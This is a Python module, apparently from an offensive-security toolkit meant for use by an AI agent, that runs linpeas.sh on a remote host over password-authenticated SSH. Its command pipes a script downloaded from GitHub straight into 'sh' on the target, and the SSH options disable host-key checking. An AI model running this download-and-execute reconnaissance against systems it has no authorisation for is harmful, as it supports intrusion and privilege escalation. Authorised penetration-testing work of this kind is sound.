"""
Subprocess execution for linpeas: downloads and runs linpeas.sh on a
host already reached over SSH. No parsing logic here -- see parse.py.

``sshpass`` supplies the single password for a non-interactive ``ssh``
session, which then pipes the latest linpeas.sh release straight into
``sh`` on the remote host. There is no local-execution mode and no
SSH-key auth mode.
"""
from __future__ import annotations

import shutil
import subprocess
from typing import List, Optional

from tradecraft.adapters.linpeas import parse as lp_parse

DEFAULT_TIMEOUT = 300  # linpeas.sh can take a few minutes on a full sweep.

REMOTE_CMD = (
    "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/"
    "download/linpeas.sh | sh"
)


def find_sshpass_binary() -> Optional[str]:
    """Finds the sshpass binary on PATH."""
    return shutil.which("sshpass")


def build_argv(
    target: str,
    ssh_user: str,
    ssh_pass: str,
    binary: str = "sshpass",
) -> List[str]:
    """Builds argv for one ``sshpass ssh ... "curl ... | sh"`` run."""
    host, port = lp_parse.parse_host_port(target)

    argv = [
        binary,
        "-p",
        ssh_pass,
        "ssh",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "UserKnownHostsFile=/dev/null",
    ]
    if port is not None:
        argv.extend(["-p", str(port)])
    argv.append(f"{ssh_user}@{host}")
    argv.append(REMOTE_CMD)
    return argv


def execute(
    target: str,
    ssh_user: str,
    ssh_pass: str,
    timeout: Optional[int] = None,
    runner=None,
) -> lp_parse.RawLinpeasResult:
    """Executes one linpeas-over-SSH run."""
    host, _ = lp_parse.parse_host_port(target)
    if not host:
        return lp_parse.RawLinpeasResult(
            target=(target or "").strip(), error="empty target host"
        )

    if not (ssh_user or "").strip():
        return lp_parse.RawLinpeasResult(
            target=host, error="ssh_user is required for linpeas"
        )
    if not (ssh_pass or "").strip():
        return lp_parse.RawLinpeasResult(
            target=host, error="ssh_pass is required for linpeas"
        )

    binary = find_sshpass_binary()
    if binary is None:
        return lp_parse.RawLinpeasResult(
            target=host, error="sshpass binary not found on PATH"
        )

    if timeout is None:
        timeout = DEFAULT_TIMEOUT

    argv = build_argv(
        target=target, ssh_user=ssh_user, ssh_pass=ssh_pass, binary=binary
    )

    run_cmd = runner or subprocess.run

    try:
        proc = run_cmd(
            argv,
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return lp_parse.RawLinpeasResult(
            target=host, error=f"linpeas execution timed out after {timeout}s"
        )
    except Exception as exc:  # noqa: BLE001 - surfaced to the model as a tool error
        return lp_parse.RawLinpeasResult(
            target=host, error=f"linpeas execution failed: {exc}"
        )

    return lp_parse.RawLinpeasResult(
        target=host,
        stdout=proc.stdout or "",
        stderr=proc.stderr or "",
        returncode=proc.returncode,
    )
